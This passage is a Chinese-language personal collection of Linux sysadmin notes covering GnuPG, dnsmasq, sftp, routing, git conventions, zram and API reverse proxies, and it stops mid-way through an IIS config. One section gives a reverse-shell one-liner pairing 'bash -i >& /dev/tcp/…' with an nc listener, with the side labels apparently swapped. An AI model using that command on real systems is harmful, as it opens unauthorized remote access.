# 那些杂七杂八的记录(一)


&lt;!--more--&gt;

## GnuPG 加密与解密  
### gpg 对称加密  
- 加密:  `gpg -c &lt;file&gt;`， 输入两次加密密码，完成后生成文件`&lt;file&gt;.gpg`(加密后源文件保留)  
- 解密:  `gpg &lt;file&gt;.gpg`, 输入加密密码,正确后生成文件`&lt;file&gt;`(解密后加密文件保留)  
### gpg 非对称加密  
- 非对称加密/解密文件时，`Server` 生成私钥与公钥，并把公钥发送给`Client`, `Client` 使用公钥加密数据，并把加密后的数据传给`Server` ，`Server` 最后使用自己的私钥解密数据。  

    ```bash 
    # Server: 创建公钥私钥
    $&gt; gpg --gen-key   # 需要填写一些东西，可根据需求选择 
    ## 配置文件介绍
    # GPG 配置文件目录:~/.gnupg
    # ~/.gnupg/gpg.conf – 配置文件
    # ~/.gnupg/trustdb.gpg – 信任库
    # ~/.gnupg/pubring.gpg – 公钥库
    # ~/.gnupg/secring.gpg – 私钥库 

    $&gt; gpg --list-key  # 密钥查看 
    $&gt; gpg -a --export &lt;UserID&gt; &gt; ./public-key.pub # Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 &lt;UserID&gt; 被标记为绝对信任  
    # 将公钥传送到Client上 

    # Client: 导入 公钥 
    $&gt; gpg --import ./public-key.pub 

    # Client: 文件加密 
    $&gt; gpg -e -r &lt;UserID&gt; &lt;file&gt; 
    &lt;file&gt;.gpg 
    # 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥  
    # Server: 文件解密 
    $&gt; gpg -d &lt;file&gt;.gpg 
    &lt;file&gt; 
    ```

## DOCKER 创建 DNS SERVER  
```bash
$&gt; vim /data/docker/dns/dnsmasq.conf 
#dnsmasq config, for a complete example, see:
#  http://oss.segetech.com/intra/srv/dnsmasq.conf
#log all dns queries
log-queries
#dont use hosts nameservers
no-resolv
#use cloudflare as default nameservers, prefer 1^4
server=8.8.4.4
server=8.8.8.8
strict-order
#serve all .company queries using a specific nameserver
server=/company/10.0.0.1
#explicitly define host-ip mappings
address=/www.example.com/172.16.10.10

$&gt; docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt &#34;max-size=100m&#34; -e &#34;HTTP_USER=root&#34; -e &#34;HTTP_PASS=root&#34; jpillora/dnsmasq

```

## dotnet 环境搭建 
```bash
$&gt; rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm
$&gt; yum install libgdiplus-devel libunwind icu -y 
$&gt; wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm
$&gt; yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y
$&gt; dotnet --info
# supervisor 管理 https://blog.0x5c0f.cc/2019/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86
yum install supervisor -y
# 前端管理样式页面 
/usr/lib/python2.7/site-packages/supervisor/ui/status.html
```

## 在Linux中删除virbr0接口
`virbr0`是`CentOS7`在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的
```bash
$&gt; virsh net-list 
$&gt; virsh net-destroy default 
$&gt; virsh net-undefine default
$&gt; systemctl restart libvirtd.service
```

## Linux 杀毒软件 clamav 
```bash
# 需要安装epel源
$&gt;　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd
# 注释掉 /etc/freshclam.conf /etc/clamd.d/scan.conf 中的Example 
# 更新病毒库　
$&gt; /usr/bin/freshclam
# 扫描 
$&gt; clamscan -ri /data --remove  -l /var/log/clamscan.log 

```

## linux 合并文件系统 margerfs 
&gt;[https://wzyboy.im/post/1148.html](https://wzyboy.im/post/1148.html)

&gt;[https://github.com/trapexit/mergerfs](https://github.com/trapexit/mergerfs)  

使用示例: 
```bash
# 挂载到的目录必须为空
# 命令挂载
$&gt; mergerfs -o defaults,allow_other,use_ino,minfreespace=10G,ignorepponrename=true /data01:/data02 /shares

# fstab
$&gt; /etc/fstab
/data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace=10G,ignorepponrename=true 0 0

```

## linux sftp 搭建  
```bash
# 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash)
# 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议
# 
Match Group/User  www                          # 限制某个组或者某个用户使用以下规则
    # 仅允许使用sftp , -l INFO 表示记录 SFTP 的 INFO 级别日志。-f AUTH 指定 SFTP 鉴权日志级别为 AUTH
    ForceCommand internal-sftp -l INFO -f AUTH 
    # 禁止使用密码进行身份验证，只允许通过公钥认证
    PasswordAuthentication no   
    # 禁止 SSH 隧道功能
    PermitTunnel no
    # 禁止 SSH 代理转发 
    AllowAgentForwarding no
    # 禁止 TCP 转发
    AllowTcpForwarding no
```

## 监听本地网卡上没有的IP地址
```bash
# 一般用于 keepalive &#43; nginx 使用
echo &#39;net.ipv4.ip_nonlocal_bind = 1&#39; &gt;&gt; /etc/sysctl.conf
```

## 腾讯云第二块网卡绑定公网ip
官方文档是有记录的，这儿记录下服务器上的设置  
```bash
# 网卡初始化

DEVICE=eth1
NM_CONTROLLED=yes
ONBOOT=yes
IPADDR=&lt;网卡2IP&gt;
NETMASK=255.255.240.0

# 
echo &#34;10 t1&#34; &gt;&gt; /etc/iproute2/rt_tables
echo &#34;20 t2&#34; &gt;&gt; /etc/iproute2/rt_tables

/usr/sbin/ip route add default dev eth0 via 172.21.0.1 table 10
/usr/sbin/ip route add default dev eth1 via 172.21.0.1 table 20

/usr/sbin/ip rule add from 172.21.2.168 table 10
/usr/sbin/ip rule add from 172.21.2.74 table 20
```

## shell 反弹 
&gt; https://blog.csdn.net/weixin_41082546/article/details/104123131  


```bash 
# 被控端执行  
nc -lvp 65535
# 控制端执行 
bash -i &gt;&amp; /dev/tcp/&lt;被控端ip&gt;/65535 0&gt;&amp;1
```

## nginx 获取cdn真实用户ip 
```conf
# client_real_ip 即为用户真实IP,可直接用于替换 remote_addr 
    map $http_x_forwarded_for $client_real_ip {
    &#34;&#34; $remote_addr;
    # fix: 兼容ipv6
    ~^(?P&lt;firstAddr&gt;[0-9a-fA-F:.]&#43;),?.*$ $firstAddr;
    }
```

## virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用 
此次问题实际出现是在`windows`上, 理论上说`linux`下若使用`nat`功能可能也会出现该问题(至于为什么用`nat`,`virtualbox`似乎并不支持桥接网卡,因此要为虚拟机分配物理`ip`似乎就只能在物理机绑定多个`ip`,然后`nat`转发到虚拟机中), `virtualbox`在转发`80`端口时似乎会与物理机的`80`冲突,从而导致转发无效,这个可能是因为我物理机也启用了`IIS`的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.
- 解决方案
 1. 我是用的 `windows`的端口转发解决的, `virtualbox`在`nat`的时候转发一个其他端口(比如`8080`)到内部的`80`, 然后在`windows` 在进行一次转发,将绑定的`ip`的`80`端口转发到`8080`上,这样也可以解决,骚操作看 [`windows命令收集`-`端口转发`](/2022/命令收集/#3-windows-端口转发)
 2. 还有个说的是用管理员身份运行`virtualbox`,也可以解决,不过我没有验证过 

 &gt; [https://www.coder.work/article/6503907](https://www.coder.work/article/6503907)


## 服务器默认端口优化   
1. 检查所有非22开启的端口：`netstat -lntp`  
    ```bash
    $&gt; netstat -lntp
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1317/master         
    tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1569/sshd           
    tcp6       0      0 ::1:25                  :::*                    LISTEN      1317/master         
    tcp6       0      0 :::111                  :::*                    LISTEN      1/systemd           
    tcp6       0      0 :::22                   :::*                    LISTEN      1569/sshd 
    ```  

2. 查询`/etc/services`下端口对应的服务：`grep -E &#34;25|111/&#34; /etc/services `   
    ```bash 
    $&gt; grep -E &#34;\ 25/|\ 111/&#34; /etc/services 
    smtp            25/tcp          mail
    smtp            25/udp          mail
    sunrpc          111/tcp         portmapper rpcbind      # RPC 4.0 portmapper TCP
    sunrpc          111/udp         portmapper rpcbind      # RPC 4.0 portmapper UD
    ```

3. 检查服务的运行状态(第三列为服务名称)： `systemctl list-unit-files |grep -E &#34;rpcbind|portmapper|mail&#34;`, 若单个端口所映射的服务没有查询到，需要通过运行端口的`pid`去查询他具体是属于那个程序的，然后然后去查询具体的服务启动状态。  
    ```bash
    $&gt; systemctl list-unit-files |grep -E &#34;rpcbind|portmapper|postfix&#34;
    postfix.service                               enabled 
    rpcbind.service                               enabled 
    rpcbind.socket                                enabled 
    rpcbind.target                                static  
    $&gt; systemctl stop postfix.service rpcbind.service rpcbind.socket     # 关闭启动的服务
    $&gt; systemctl disable postfix.service rpcbind.service rpcbind.socket     # 禁用开机启动
    ```

## linux 下hosts文件和dns服务器的响应顺序
- 通过修改 `/etc/nsswitch.conf` 进行更换 , 更换`/etc/nsswitch.conf: 86`中的`files`和`dns`的顺序即可  

## GIT 常见代码规范 
- 分支命名  
| 分支      | 说明                                                                                                                                          |
| :-------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| `master`  | 主分支，也是用于部署生产环境的分支。需要确保`master`分支稳定性。`master`分支一般由`release`以及`hotfix`分支合并，任何时间都不能直接修改代码。 |
| `develop` | 开发分支，始终保持最新完成以及`bug`修复后的代码，用于前后端联调，一般开发的新功能时，`feature`分支都是基于`develop`分支创建的。               |
| `feature` | 开发新功能时，以`develop`为基础创建`feature`分支。分支命名时可以加上开发的功能模块，命名示例：`feature/user_module`、`feature/cart_module`    |
| `test`    | 测试分支，专门给测试人员使用，版本相对稳定。                                                                                                  |
| `release` | 预发布分支，`UAT`测试阶段使用，一般由`test`或`hotfix`分支合并，不建议直接在`release`分支上直接修改代码。                                      |
| `hotfix`  | 线上出现问题紧急线上出现紧急问题时，需要及时修复，以`master`分支为基线，创建`hotfix`分支，修复完成后，需要合并到`master`分支和`develop`分支。 |

- 分支与环境对应关系
| 分支      | 功能                      | 环境 | 可访问 |
| --------- | ------------------------- | ---- | :----: |
| `master`  | 主分支，稳定版本          | PRO  |   是   |
| `develop` | 开发分支，最新版本        | DEV  |   是   |
| `feature` | 开发分支，实现新特性      | -    |   否   |
| `test`    | 测试分支，功能测试        | FAT  |   是   |
| `release` | 预上线分支，发布新版本    | UAT  |   是   |
| `hotfix`  | 紧急修复分支，修复线上bug | -    |   否   |

- 单次提交注意事项
  - 提交问题必须为同一类别的。
  - 提交问题不要超过`3`个。
  - 提交的`commit`发现不符合规范，`git commit --amend -m &#34;新的提交信息&#34;` 或 `git reset --hard HEAD` 重新提交一次。


- 提交类型
| 类型       | 说明                                                        |
| ---------- | ----------------------------------------------------------- |
| `feat`     | 新增 `feature`                                              |
| `fix`      | 修复 `bug`                                                  |
| `docs`     | 仅仅修改了文档，比如`README`, `CHANGELOG`, `CONTRIBUTE`等等 |
| `style`    | 仅仅修改了空格、格式缩进、都好等等，不改变代码逻辑          |
| `refactor` | 代码重构，没有加新功能或者修复`bug`                         |
| `perf`     | 优化相关，比如提升性能、体验                                |
| `test`     | 测试用例，包括单元测试、集成测试等                          |
| `chore`    | 改变构建流程、或者增加依赖库、工具等                        |
| `revert`   | 回滚到上一个版本                                            |



## linux 通过s3fs挂载七牛云存储
```bash
$&gt; sudo yum install epel-release
$&gt; sudo yum install s3fs-fuse

$&gt; echo AK:SK &gt; /mnt/.passwd-s3fs
$&gt; chmod 600 /mnt/.passwd-s3fs

$&gt; s3fs s3空间名 /mnt/s3fs -o passwd_file=/mnt/.passwd-s3fs -o url=http://s3-cn-north-1.qiniucs.com -o use_path_request_style   # -o dbglevel=info -f -o curldbg # 日志信息

```

## 普通用户校验是否有权限通过docker.sock操作 docker
```
sudo -u zabbix curl --unix-socket /var/run/docker.sock --no-buffer -XGET v1.24/_ping
```

## rdesktop 远程桌面工具安装
- rdesktop 用于linux下的rdp工具，还是非常好用的 
```
$&gt; sudo dnf install rdesktop
$&gt; rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator &lt;server_ip&gt;:&lt;port&gt; -p&lt;password&gt;
```

## Umask 计算方法 
- 当创建目录时候，`目录创建后的权限` =  `默认目录最大权限(777)` - `umask 权限`  
    - `umask=0022 --&gt; 777 - 022 = 755(目录权限)`  
- 当创建文件时候，若`umask`值所有位数为偶数，则 `文件创建后的权限` = `默认文件最大权限(666)` - `umask权限`  
    - `umask = 0022 --&gt; 666 - 022 = 644(文件权限)`  
- 当创建文件时候，若`umask`值部分或全部为奇数时候，则 `文件创建后的权限` = `默认文件最大权限(666)` - `umask权限` &#43; `umask基数位&#43;1`  
    - `umask = 0045 --&gt; 666 - 045 = (621 &#43; 001) = 622`  
    - `umask = 0033 --&gt; 666 - 033 = (633 &#43; 011) = 644`  

## 输入输出重定向  

### 文件描述符    
|文件描述符|文件名|类型|硬件|
|-|-|-|-|
|`0`|`stdin`|标准输入文件|键盘|
|`1`|`stdout`|标准输出文件|显示器|
|`2`|`stderr`|标准错误输出文件|显示器|

### 标准重定向 
&gt;[https://aimuke.github.io/linux/2019/05/29/redirect/](https://aimuke.github.io/linux/2019/05/29/redirect/)  

|类型|表现形式|
|-|-|
|标准输入重定向|`0&lt;`或`&lt;`|
|追加输入重定向|`0&lt;&lt;`或`&lt;`|
|标准输出重定向|`1&gt;`或`&gt;`|
|标准输出追加重定向|`1&gt;&gt;`或`&gt;&gt;`|
|标准错误重定向|`2&gt;`|
|标准错误追加重定向|`2&gt;&gt;`|
|标准错误重定向到标准输出|`2&gt;&amp;1`，`(cmd &gt; /dev/null 2&gt;&amp;1) == (cmd &gt;&amp; /dev/null) == (cmd &amp;&gt; /dev/null)`|


## linux 下挂载 esxi 的 vmfs 文件系统 
`vmfs` 是`esxi`的文件系统,物理机使用`esxi`虚拟化后硬盘的文件格式就是这个. `linux`下可以直接将其挂在到本地
`vmfs-tools`是`linux`挂载`vmfs`的驱动程序(应该也可以挂在`vmdk`文件,*我没有试过*),默认在`ubuntu`上已获得支持,`fedora`上可以直接将`ubuntu`上的安装程序复制过来也可以直接使用. 

&gt; https://github.com/glandium/vmfs-tools 

```bash
# 安装后挂载  
vmfs-fuse /dev/sdc1 /mnt/sdc 
```

## cp mv 进度条补丁
```bash
# 注意尽量不要使用 root 用户操作
# 下载coreutils
$ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.32.tar.xz
$ tar -xJf coreutils-8.32.tar.xz
$ cd coreutils-8.32/

# 下载 github 上的补丁
$ wget https://raw.githubusercontent.com/jarun/advcpmv/master/advcpmv-0.8-8.32.patch
# 打补丁，实现进度条显示
$ patch -p1 -i advcpmv-0.8-8.32.patch
patching file src/copy.c
patching file src/copy.h
patching file src/cp.c
patching file src/mv.c

# 编译安装
$ ./configure
$ make
# 将打补丁生成的cp和mv命令的二进制文件复制到bin目录下
$ sudo cp src/cp /usr/local/bin/cp
$ sudo cp src/mv /usr/local/bin/mv
```

## 更改docker容器中的时间而不影响宿主机 
```bash
$&gt; git clone https://github.com/wolfcw/libfaketime.git
$&gt; cd libfaketime
$&gt; make 
$&gt; docker cp ./src/libfaketime.so.1 centos:/usr/lib/
$&gt; docker exec -it centos bash 
# 修改为指定时间
$&gt;&gt; export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME=&#34;2020-05-01 00:01:00&#34;
# 修改为几天后 
$&gt;&gt; export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME=&#34;&#43;2d&#34;
# 恢复 
$&gt;&gt; export LD_PRELOAD=
```

## ubuntu/debian切换shell（dash/bash）
```bash
$&gt; dpkg-reconfigure dash
# 弹出窗口选择 &lt;No&gt;
```

## openvpn 指定路由配置 
&gt; https://blog.csdn.net/joshua317/article/details/120245443  
```bash
# 在 verb 3 下添加
route-nopull    #  route-nopull 配置后不会有任何网络请求走openvpn
# 当客户端加入 route-nopull 后,所有出去的访问都不从 Openvpn 出去,但可通过添加 vpn_gateway 参数使部分IP访问走 Openvpn 出去
route 172.16.0.0 255.255.0.0  vpn_gateway           
route 140.143.61.12 255.255.255.255  vpn_gateway
```

## svg 背景透明图片
```xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;no&#34;?&gt;
&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;
&lt;svg version=&#34;1.1&#34; id=&#34;Layer_1&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; x=&#34;0px&#34; y=&#34;0px&#34; width=&#34;250px&#34; height=&#34;269px&#34; viewBox=&#34;0 0 250 269&#34; enable-background=&#34;new 0 0 250 269&#34; xml:space=&#34;preserve&#34;&gt;  
    &lt;image id=&#34;image0&#34; width=&#34;250&#34; height=&#34;269&#34; x=&#34;0&#34; y=&#34;0&#34;
        href=&#34;data:image/png;base64,&lt;base64 code&gt;&#34; /&gt;
&lt;/svg&gt;
```

## CentOS 启用zram(服务器内存过低，可用于替代swap)
&gt; [https://fedoraproject.org/wiki/Changes/SwapOnZRAM](https://fedoraproject.org/wiki/Changes/SwapOnZRAM)   
```bash
# 加载内核模块 
# num_devices 是 zRAM模块的参数，zram num_devices=1 表示仅创建一个设备文件，该文件将会保存在设备目录，文件名称是 /dev/zram0。
# 如果 num_devices 的数值不等于 1，内核将会创建多个 zram 文件 /dev/zram{0,1,2,3...}

# 持久化开启/加载 zRAM 模块
$&gt; echo &#34;zram&#34; | sudo tee -a /etc/modules-load.d/zram.conf
$&gt; echo &#34;options zram num_devices=1&#34; | sudo tee -a /etc/modprobe.d/zram.conf

# 持久化 zRAM 配置  disksize: zram(swap)大小(内存的1.5-2倍，内存大于8G，设为8G), comp_algorithm: 压缩算法(fedora 配置 lzo [lzo-rle] lz4 lz4hc 842 zstd，但centos似乎只支持lzo)
$&gt; echo &#39;KERNEL==&#34;zram0&#34;, ATTR{disksize}=&#34;512M&#34;, ATTR{comp_algorithm}=&#34;lzo&#34;, TAG&#43;=&#34;systemd&#34;&#39; | sudo tee  /etc/udev/rules.d/99-zram.rules

# 创建systemd单元，自动挂载 zram (zram会自动叠加已经挂载的swap)
$&gt; vim /etc/systemd/system/zram.service
[Unit]
Description=Swap with zram
After=multi-user.target

[Service]
Type=oneshot
RemainAfterExit=true
ExecStartPre=/sbin/mkswap /dev/zram0
ExecStart=/sbin/swapon /dev/zram0
ExecStop=/sbin/swapoff /dev/zram0

[Install]
WantedBy=multi-user.target

# 重启服务器
echo &#34;512M&#34; | sudo tee /sys/block/zram0/disksize
echo &#34;lzo&#34; | sudo tee /sys/block/zram0/comp_algorithm

```
## virtualbox NAT端口映射配置
`windows` 和 `linux`命令应一致(只测试过`windows`)，用于快速批量映射
```shell
# VBoxManage natnetwork modify --netname &#34;10.0.2.0/24&#34; --port-forward-4 &#34;名称:协议:[主机ip]:主机端口:[虚拟机ip]:虚拟机端口&#34;
VBoxManage natnetwork modify --netname &#34;10.0.2.0/24&#34; --port-forward-4 &#34;172.16.10.230-2222:tcp:[172.16.10.230]:2222:[10.0.2.230]:2222&#34;
```

## 单位换算
```md
- `MBytes`是`Megabytes`的缩写，表示兆字节。其中，&#34;`M`&#34; 代表兆（`Mega`），是一个表示数量级的单位前缀，&#34;`Bytes`&#34; 则代表字节。兆字节通常用于描述计算机存储容量的大小，例如硬盘、固态硬盘、内存等存储设备的容量。1 MByte 等于 1024 * 1024 字节，即 1048576 字节。
- `MBits`是`Megabits`的缩写，意思是兆比特(`Mb`)。它表示数据传输速率的单位之一，通常用于测量网络带宽、硬件设备传输速度等。`1Mb = 1*8 = 8MBytes(8MB)`
- `1 MB/s`(`Megabytes`/`MBytes`/`兆字节每秒`) 等于 `8 Mb/s`(`兆比特每秒`/`Megabits`/`MBits`)。
```

## mailx smtp使用ssl时，邮件发送报错 &#34;Error in certificate: Peer’s certificate issuer is not recognized.&#34;
```bash
# 生成证书
echo -n | openssl s_client -connect smtp.exmail.qq.com:465 | sed -ne &#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&#39; &gt; /etc/mail.rc.d/qq.crt
certutil -A -n &#34;GeoTrust SSL CA&#34; -t &#34;C,,&#34; -d /etc/mail.rc.d -i /etc/mail.rc.d/qq.crt
certutil -A -n &#34;GeoTrust Global CA&#34; -t &#34;C,,&#34; -d /etc/mail.rc.d -i /etc/mail.rc.d/qq.crt

# 校验证书 
certutil -A -n &#34;GeoTrust SSL CA - G3&#34; -t &#34;Pu,Pu,Pu&#34; -d ./ -i qq.crt
## 成功显示以下内容
# Notice: Trust flag u is set automatically if the private key is present.

# 修改 /etc/mail.rc 末尾添加,即可 set nss-config-dir=/etc/mail.rc.d 
```

## jenkins 设置国内插件源 
```ini
# 阿里云源: https://mirrors.aliyun.com/jenkins/updates/update-center.json
Jenkins管理界面中打开“Manage Plugins”（管理插件），然后选择“Advanced”（高级选项）标签页，在“Update Site”下拉列表中添加上述地址，并单击“Apply”（应用）按钮即可
```

## /etc/sysconfig/network-scripts 为空
- 本来 `/etc/sysconfig/network-scripts` 下是有网卡的配置文件的，我不知道是做了什么事情(我记得只是在调路由表)，在操作了几次后，我就发现我的网卡配置文件都没了，但是网络连接却是正常的，后面经多方资料查询，发现是`NetworkManager`，他会自动管理网卡，而由他管理的话，那么就可能不再需要`/etc/sysconfig/network-scripts/`下的配置文件了。他的默认配置文件是在`/etc/NetworkManager/system-connections`下
- 如何继续使用`/etc/sysconfig/network-scripts`下的配置文件来继续管理网卡呢
    ```bash
    $&gt; sudo vi /etc/NetworkManager/NetworkManager.conf
    [main]
    plugins=ifcfg-rh
    # plugins 的值可以是以下几种：
    # 如果plugins没有显式配置该选项，则NetworkManager将默认启用一组预安装的插件
    # ifcfg-rh：用于读取和解析CentOS、RHEL等发行版相关的网卡配置文件。
    # keyfile：用于从/etc/NetworkManager/system-connections目录中读取网络连接配置信息。
    # dhcp：用于与DHCP服务器进行通信，并获取IP地址、子网掩码、DNS服务器等网络参数。
    # wifi：用于管理Wi-Fi连接，并搜索可用的Wi-Fi热点。
    # ibft、team、bridge 等等

    [ifcfg-rh]
    wifi.scan-rand-mac-address=no
    # 用于控制系统在扫描Wi-Fi网络时是否使用随机MAC地址。具体来说，如果将该选项设置为“no”，则系统会使用真实的MAC地址扫描Wi-Fi网络。
    ```

## 双网卡优先级配置  
- 网卡配置文件中 添加`IPV4_ROUTE_METRIC`参数，值越低，优先级越高

## 网卡连接后执行某个脚本  
- 脚本存放位置: `/etc/NetworkManager/dispatcher.d`

## 网卡配置文件固定路由设置 
1. 关闭网卡自动路由功能
    ```bash
    # /etc/sysconfig/network-scripts/ifcfg-enp0s31f6
    PEERROUTES=no
    ```
2. 添加固定路由
    ```bash
    # /etc/sysconfig/network-scripts/route-enp0s31f6
    ADDRESS0=172.16.0.0 # 目标地址
    NETMASK0=255.255.0.0 # 子网掩码
    GATEWAY0=&lt;172.16.31.1&gt; 
    ```

## acme.sh 证书安装 `--reloadcmd`无效问题
一般来说，我们在使用自动续签证书的时候，需要让`acme.sh`更新证书后自动重载一下`nginx`,但是我们的`nginx`基本都是自编译的，所以得使用`acme.sh`的`--reloadcmd`参数，但实际上在初始化时候如果你没有指定`--reloadcmd`,那么第一次部署后即使你在更新的自动任务中添加`--reloadcmd`也是无效的，这个时候可以直接修改配置证书的配置文件`/root/.acme.sh/example.com/example.com.conf`，在里面添加一行`Le_ReloadCmd=&#39;/usr/bin/systemctl restart nginx.service&#39;`就可以了。当然，也可以在初始安装证书的时候添加`--reloadcmd`参数，他会给你自动加入这个参数到配置文件中.

## openai api接口反向代理实现国内直接使用
- `nginx` 反向代理设置(仅示例) 
    ```conf
    server {
        listen 80;
        listen 443 ssl http2;
        
        server_name api.example.com;
        #  ssl 相关配置
        include conf.d/api.example.com.ssl;
        

        access_log logs/api.example.com.log main;

        add_header Access-Control-Allow-Origin *;

        location / {
            default_type &#39;application/json&#39;;
            return 200 &#39;{&#34;status&#34;: &#34;ok&#34;}&#39;;
        }

        location /v1 {
            proxy_pass https://api.openai.com;
            proxy_ssl_server_name on;
            proxy_set_header Host api.openai.com;
            proxy_set_header X-Real-IP $remote_addr;
        }

        location ~ /openai/(.*) {
            proxy_pass https://api.openai.com/$1$is_args$args;
            proxy_set_header Host api.openai.com;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            # 如果响应是流式的
            proxy_set_header Connection &#39;&#39;;
            proxy_http_version 1.1;
            chunked_transfer_encoding off;
            proxy_buffering off;
            proxy_cache off;
            # 如果响应是一般的
            proxy_buffer_size 128k;
            proxy_buffers 4 256k;
            proxy_busy_buffers_size 256k;
        }

    }

    ```


- 利用`cloudflare`的`Workers`来实现
    - 登陆后在左侧栏中，选择`Workers`,点击`创建服务`,输入一个看着顺眼的服务名,选择`http处理程序`,然后点击`创建服务`.然后点击右上角`快速编辑`,在左侧框中填入一下代码，保存部署即可。
    ```ts
    const TELEGRAPH_URL = &#39;https://api.openai.com&#39;;


    addEventListener(&#39;fetch&#39;, event =&gt; {
    event.respondWith(handleRequest(event.request))
    })


    async function handleRequest(request) {
    const url = new URL(request.url);
    url.host = TELEGRAPH_URL.replace(/^https?:\/\//, &#39;&#39;);


    const modifiedRequest = new Request(url.toString(), {
        headers: request.headers,
        method: request.method,
        body: request.body,
        redirect: &#39;follow&#39;
    });


    const response = await fetch(modifiedRequest);
    const modifiedResponse = new Response(response.body, response);


    // 添加允许跨域访问的响应头
    modifiedResponse.headers.set(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;);


    return modifiedResponse;
    }
    ```
    - 上诉步骤完成后，配置工作基本就算完成了，`cloudflare`会有一个默认的域名，但由于某些原因，可能访问效果不是很好，不过自定义域名可以解决，具体配置在`触发器`中。此处可以定义你自己想要设定的域名，不过，要定义自定义域名，你的域名`ns`需要指定到`cloudflare`中，后续内容自行研究。

- `vercel` 反代`openai`
    ```json
    // vercel.json -- cmd: vercel --prod
    {
        &#34;rewrites&#34;: [
            { &#34;source&#34;: &#34;/&#34;, &#34;destination&#34;: &#34;https://api.openai.com&#34; },
            {
                &#34;source&#34;: &#34;/:match*&#34;,
                &#34;destination&#34;: &#34;https://api.openai.com/:match*&#34;
            // },
            // {
            //    &#34;source&#34;: &#34;/openai/:match*&#34;,
            //    &#34;destination&#34;: &#34;https://api.openai.com/:match*&#34;
            }
        ]
    }
    ```



## 云安全组配置规范 
不同的云厂商他的云策略是有差异的，阿里云的云安全组是以优先级来判定的规则先后的(1-100)数字越小，优先级越高。腾讯云为顺序判定，与iptables类似，从上向下。亚马逊无要求，默认拒绝所有流量。需主动配置内外网策略(未详细测试)

云策略规则部署规范(以阿里云为例)
1. 默认放行所有公网出流量(此项默认，可不做修改。优先级:1 )
2. 添加优先级**最低的**入口流量限制(所有协议。优先级: 100)
3. 添加所有常用的可信端口(如:80、443。优先级: 90)
4. 添加受信ip(如: 公司、监控机、堡垒机等IP。优先级: 1-50)

注意事项: 
1. 建议每个受信组单独建立一个安全组，方便管理。
2. 建议配合云策略和服务器防火墙共同使用。

## webmin 密码修改 
- `/usr/libexec/webmin/changepass.pl /etc/webmin &lt;user&gt; &lt;passwd&gt;` 

## 记录一个nginx 反代规则
```sh
# 请求 以 /example 开头的uri，反向代理到 http://127.0.0.1:8081/example 下

location ~ ^/example($|/) {
    proxy_pass http://127.0.0.1:8081$request_uri;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}

```

## debian pull 镜像 408 错误
```bash
# 不知道原因,解决方案如下
# 参考地址: https://stackoverflow.com/questions/38386809/docker-error-http-408-response-body-invalid-character-looking-for-beginnin
sudo ip link set dev eth0 mtu 1450
```

## 在bash脚本中使用别名(alias)的方式
```bash
# 打开alias支持
shopt -s expand_aliases
```

## rabbitmq ssl 证书配置
&gt; https://www.cnblogs.com/hellxz/p/15776987.html
```bash
# ssl-server: 
sh make_server_cert.sh rabbitmq-server &lt;server_passwd&gt;
# ssl-client:
sh create_client_cert.sh rabbitmq-client &lt;client_passwd&gt;
```

## prometheus 不同指标计间的计算方法
```ini
## redis_memory_used_bytes Redis 内存使用量
### redis_memory_used_bytes{cloudtype=&#34;阿里云&#34;, hostname=&#34;riecaeph0noo&#34;, instance=&#34;127.0.0.1:16370&#34;, job=&#34;RedisStatusMonitor&#34;, ostype=&#34;linux&#34;, services=&#34;redis&#34;} 3322384
## node_memory_MemTotal_bytes 系统总内存
###  node_memory_MemTotal_bytes{cloudtype=&#34;阿里云&#34;, hostname=&#34;riecaeph0noo&#34;, instance=&#34;1.1.1.1&#34;, job=&#34;ServerStatusMonitor&#34;, ostype=&#34;linux&#34;, services=&#34;server&#34;} 32868929536

# 方法一: 
## 计算 Redis 内存使用量占主机内存总和的百分比(适用指标标签不一致的情况)

redis_memory_used_bytes / on(hostname) group_left label_replace(node_memory_MemTotal_bytes, &#34;hostname_group&#34;, &#34;&#34;, &#34;hostname&#34;, &#34;(.*)&#34;) * 100 &gt; 90

# 方法二: 

redis_memory_used_bytes / on(hostname) group_left node_memory_MemTotal_bytes

```

## IIS http 强制跳转 https 
- 此项未校验,来源于`chatgpt`
    ```xml
    &lt;configuration&gt;
    &lt;system.webServer&gt;
        &lt;rewrite&gt;
